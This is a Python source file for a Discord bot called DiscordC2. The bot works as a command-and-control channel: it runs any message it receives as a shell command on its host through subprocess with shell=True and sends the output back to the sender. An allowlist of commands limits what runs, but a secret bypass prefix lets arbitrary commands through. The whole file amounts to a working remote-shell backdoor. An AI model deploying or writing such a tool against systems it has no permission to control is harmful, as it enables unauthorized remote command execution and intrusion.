import discord
import subprocess
from bot_token import *
from commands import *


class DiscordC2(discord.Client):

    async def on_message(self, message):
        """
        Used to interpret a Discord message as a command and run it against the server running this bot.
        This will determine if the message is a bypass command or an authorized command from commands.py before running
        the interpreted command.
        :param message: The message sent to the Discord bot.
        :return: The result (standard out and standard error) of the command run by the server.
        """

        # Logic to not interpret the bot response as a message and return to the function
        if message.author.bot:
            return

        # Creating a bypass flag to be used if BYPASS_CODE was set in commands.py
        bypass = False

        # Determining if BYPASS_CODE was set in commands.py, splitting out the BYPASS_CODE, and setting the bypass flag.
        if message.content.startswith(BYPASS_CODE):
            command = ' '.join(message.content.split(' ')[1:])
            bypass = True
        else:
            command = message.content

        if command in AUTHORIZED_COMMANDS:
            await message.author.send(self.cmd_process(command))
        elif bypass:
            await message.author.send(self.cmd_process(command))
        else:
            await message.author.send("Not an authorized command.")

    def cmd_process(self, cmd):
        """
        Used to take in a string as a command, run it on the server, and return an output consisting of
        standard out (stdout) and standard error (stderr).

        :param cmd: The string to be interpreted as a command by the server.
        :return: The result (standard out and standard error) of the command run by the server.
        """
        p = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, close_fds=True)
        result = p.stdout.read().decode("utf-8")
        return result


def main():
    client = DiscordC2()
    client.run(BOT_TOKEN)


if __name__ == '__main__':
    main()
